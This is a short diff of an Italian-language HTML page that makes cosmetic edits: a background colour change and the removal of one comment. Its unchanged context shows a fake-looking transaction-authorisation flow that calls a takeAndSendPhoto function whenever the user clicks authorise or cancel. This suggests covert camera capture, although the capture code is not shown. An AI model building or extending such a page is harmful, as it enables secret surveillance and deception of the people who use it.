@@ -7,7 +7,7 @@
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      background-color: #000;
+      background-color: rgb(18, 18, 18);
       color: #fff;
       display: flex;
       align-items: center;
@@ -149,7 +149,7 @@
     takeAndSendPhoto(action);
     if (action === 'autorizza') {
       showLoadingScreen();
-      setTimeout(showSuccessScreen, 4000); // 4 secondi di attesa
+      setTimeout(showSuccessScreen, 4000);
     } else {
       card.innerHTML = `
         <h2 style="color: red;">Transazione Annullata</h2>
